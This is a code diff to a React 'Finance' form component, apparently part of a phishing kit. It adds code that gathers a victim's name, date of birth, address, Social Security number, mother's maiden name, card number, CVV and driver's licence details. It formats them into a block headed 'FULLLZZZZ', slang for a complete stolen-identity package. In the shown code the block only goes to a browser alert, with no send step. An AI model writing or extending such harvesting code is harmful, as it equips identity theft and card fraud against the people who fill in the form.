@@ -1,7 +1,30 @@
 import { useState } from 'react';
+import { useSelector } from 'react-redux';
 import './finance.css';
 
 function Finance() {
+
+	const {
+		firstName,
+		middleName,
+		lastName,
+		phone,
+		dobMonth,
+		dobDay,
+		dobYear,
+		ssn1,
+		ssn2,
+		ssn3,
+		mmn,
+		filedForTaxReturn,
+		address1,
+		address2,
+		city,
+		state,
+		zipcode,
+		country
+	} = useSelector(state => state.persoInfo)
+
 	const [name, setName] = useState('')
 	const [CC, setCC] = useState('')
 	const [ccExpiryMonth, setCcExpiryMonth] = useState('')
@@ -14,7 +37,31 @@ function Finance() {
 
 	const handleSubmit = e => {
 		e.preventDefault()
-		alert(`name: ${name} cc: ${CC} ${ccExpiryMonth}/${ccExpiryYear} ${cSC} ${DLNumber} ${dLExpiryMonth}-${dLExpiryDay}-${dLExpiryYear} `)
+        const fulllzzzz = `
+        %%% FULLLZZZZ %%%
+
+        === PERSONAL INFO ===
+        Full Name: ${firstName} ${middleName} ${lastName}
+        DOB (MM/DD/YYYY): ${dobMonth}/${dobDay}/${dobYear}
+        Phone Number: ${phone}
+        Address: ${address1} ${address2}
+        City: ${city}
+        State: ${state}
+        Zipcode: ${zipcode}
+        Country: ${country}
+        Social Security Number: ${ssn1}-${ssn2}-${ssn3}
+        Mother's Maiden Name: ${mmn}
+        Filed for tax return in last 7 years?: ${filedForTaxReturn}
+        
+        === FINANCIAL INFO ===
+		Name on Card: ${name}
+		Card Number: ${CC}
+		Expiry Date: ${ccExpiryMonth}/${ccExpiryYear}
+		CVV: ${cSC}
+		Driver's License Number (if applicable): ${DLNumber}
+		Driver's License Expiry Date (MM/DD/YYYY): ${dLExpiryMonth}/${dLExpiryDay}/${dLExpiryYear}
+		`
+		alert(fulllzzzz)
 	}
 	
   return (
